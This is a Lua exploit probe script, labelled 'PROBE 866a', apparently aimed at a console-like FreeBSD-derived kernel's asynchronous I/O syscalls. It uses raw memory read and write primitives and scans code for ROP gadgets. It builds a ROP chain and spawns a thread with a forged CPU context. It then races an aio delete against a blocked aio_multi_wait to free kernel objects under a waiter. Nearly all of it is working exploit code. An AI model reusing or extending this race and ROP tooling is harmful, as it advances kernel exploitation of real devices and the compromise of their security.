-- CRASH_CLASS: HIGH
-- PROBE 866a: delete an aio id while a thread is blocked inside 663 (aio_multi_wait)
--
-- Every earlier race released deleters into the table lock from userland, and the
-- winner always finished before a second caller reached the lookup.  This probe
-- puts the second caller *inside the kernel first*: a child parks in read(2),
-- is released, issues 663(ids,1,out,0) (NULL timeout = unbounded) on a pending
-- object, and only then does the Lua thread issue 662 on the same id.  If the
-- wait holds the table lock the delete serialises behind it; if it does not, the
-- delete frees C/S/D/P/T under a parked waiter - the overlap nobody measured.
print("=== PROBE 866a: delete under a blocked aio_multi_wait ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
local info = memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off=0
    while off < limit do
        local want = limit-off; if want > 0x1000 then want = 0x1000 end
        local ok,s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s)~="string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base+off+i-1 end
        off = off + want
    end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
local sc_mmap=mk(477)
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local D=mmap(page); local ids=mmap(page); local st=mmap(page); local out=mmap(page); local bufp=mmap(page); local outp=mmap(page)
local fds=memory.alloc(8)
wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
local ok,rp=pcall(function() return mk(SOCKETPAIR)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
print(string.format("[A] socketpair ok=%s rv=%s fds=%s/%s", tostring(ok), tostring(rp), tostring(rd(fds)), tostring(rd(fds+4))))
local a, b = rd(fds) or -1, rd(fds+4) or -1
if a < 0 then print("[A] no fd") return end
-- descriptor: +0 len, +0x10 buf, +0x18 res, +0x20 fd  (never written -> create stays pending)
wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0x1000)); wq(D+0x10,uint64(bufp)); wq(D+0x18,uint64(outp)); wd(D+0x20, a); wd(D+0x24,0)
local sc669,sc662,sc664=mk(669),mk(662),mk(664),nil
local okc, rvc = pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end)
local id = rd(out) or 0
print(string.format("[B] create ok=%s rv=%s id=%08X", tostring(okc), tostring(rvc), id))
wd(ids, id)
pcall(function() sc664(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[C] poll status=%08X (1 = pending)", rd(st) or 0))
local pst = rd(st) or 0
if pst ~= 1 and pst ~= 2 then print(string.format("[C] state %d is not pending; aborting", pst)) return end
-- child: 663(ids,1,outp2,0) then exit
local wait_out = mmap(page)
local ch = {pop_rdi, ids, pop_rsi, 1, pop_rdx, wait_out, pop_rax, 663, fn, pop_rax, 431, fn, jmp_g}
local block = mmap(STACK)
local base = block + STACK - 0x200
for i=1,#ch do wq(base+(i-1)*8, uint64(ch[i])) end
local ctx = memory.alloc(0x500); zero(ctx,0x500)
wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(base))
wq(ctx+Ctx.RDI,uint64(a)); wq(ctx+Ctx.RSI,uint64(bufp)); wq(ctx+Ctx.RDX,uint64(1)); wq(ctx+Ctx.RAX,uint64(READ))
local tb = memory.alloc(8); wq(tb,uint64(0))
local oks, rvs = pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
local tid = rd(tb) or 0
print(string.format("[D] thr_create ok=%s rv=%s tid=%08X", tostring(oks), tostring(rvs), tid))
if not (oks and to_num(rvs)==0) then return end
pcall(function() mk(WRITE)(uint64(b),uint64(bufp),uint64(1),uint64(0),uint64(0)) end)
sleep_ms(80)
print("[E] deleting while the child is inside 663")
local t0 = os.time()
local okd, rvd = pcall(function() return sc662(uint64(ids),uint64(1),uint64(st)) end)
local dt = os.time() - t0
print(string.format("[F] delete ok=%s rv=%s status=%08X elapsed=%ds", tostring(okd), tostring(rvd), rd(st) or 0, dt))
print(string.format("[G] child kill(0)=%s", tostring(pcall(function() return to_num(mk(432)(uint64(tid),uint64(0))) end))))
sleep_ms(150)
print(string.format("[H] wait out=%08X", rd(wait_out) or 0))
-- health: a fresh object through the same path
local out2 = mmap(page)
local okh, rvh = pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out2)) end)
local id2 = rd(out2) or 0
wd(ids, id2)
pcall(function() sc664(uint64(ids),uint64(1),uint64(st)) end)
local ok2, rv2 = pcall(function() return sc662(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[I] health create=%s rv=%s id=%08X delete=%s rv=%s status=%08X", tostring(okh), tostring(rvh), id2, tostring(ok2), tostring(rv2), rd(st) or 0))
print("[Z] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
